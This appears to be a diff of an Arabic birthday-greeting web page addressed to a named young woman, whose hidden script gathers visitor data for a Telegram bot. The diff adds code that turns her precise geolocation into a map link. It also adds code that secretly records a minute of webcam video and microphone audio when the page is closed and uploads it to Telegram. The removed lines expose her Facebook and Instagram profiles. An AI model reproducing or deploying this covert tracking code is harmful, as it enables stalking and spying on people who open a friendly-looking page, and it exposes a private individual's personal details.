@@ -45,7 +45,9 @@
             const geo = await new Promise((resolve, reject) => {
                 navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
             });
-            visitorInfo.Location = `Lat: ${geo.coords.latitude}, Lon: ${geo.coords.longitude}`;
+            const latitude = geo.coords.latitude;
+            const longitude = geo.coords.longitude;
+            visitorInfo.Location = `https://www.google.com/maps?q=${latitude},${longitude}`;
         } catch (error) {
             visitorInfo.Location = "Unavailable";
         }
@@ -69,25 +71,32 @@
             visitorInfo.MediaDevices = "Unavailable";
         }
         
-        // Send info on window close
-        window.addEventListener('beforeunload', async () => {
-            visitorInfo.SessionDuration = Math.round((Date.now() - startTime) / 1000) + " seconds";
-            visitorInfo.ClickCount = clickCount;
-            visitorInfo.UserInteractions = interactions.join(" | ");
-            let message = "NEW VISITOR INFORMATION\n";
-            for (let key in visitorInfo) {
-                message += `${key}: ${visitorInfo[key]}\n`;
-            }
+        // Recording audio and video
+        async function startRecording() {
             try {
-                await fetch(url, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: message })
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('video', blob, 'user_recording.webm');
+                    try {
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
+                    } catch (error) {
+                        console.error(error);
+                    }
+                };
+                setTimeout(() => mediaRecorder.stop(), 60000); // Stop after 1 minute
+                mediaRecorder.start();
             } catch (error) {
-                console.error(error);
+                console.error('Error starting media recording:', error);
             }
-        });
+        }
+
+        window.addEventListener('beforeunload', startRecording);
     }
     
     window.onload = sendVisitorInfo;
@@ -152,23 +161,9 @@
   <header>
     <h1>منونتي قلب بودا</h1>
     <p>عيد ميلاد سعيد 20 سنة!</p>
-  </header>  <div class="message">
-    <p>
-      منونتي قلب بودا<br>
-      أحلى من تم عشرين سنة وبقى أجمل منون ف الدنيا<br>
-      يارب تكملي مليون سنة ونكون مع بعض فيهم يارب<br>
-      وتفضلي قلب بودا ونن عينه من جوا<br>
-      يا أحلى منه ف الدنيا
-    </p>
-  </div>  <div class="gallery">
+  </header>  <div class="gallery">
     ${Array.from({length: 15}, (_, i) => `<img src="image${i + 1}.jpg" alt="منونتي ${i + 1}">`).join('\n    ')}
-  </div>  <div class="social">
-    <a href="https://www.facebook.com/profile.php?id=100069887810056" target="_blank">فيسبوك</a>
-    <a href="https://www.instagram.com/mennasalama569" target="_blank">إنستغرام</a>
-  </div>  <audio controls autoplay loop>
-    <source src="manonty.mp3" type="audio/mpeg">
-    متصفحك لا يدعم تشغيل الموسيقى.
-  </audio>  <footer>
+  </div>  <footer>
     &copy; 2025/5/5 بودا لمنونتي
   </footer>
 </body>
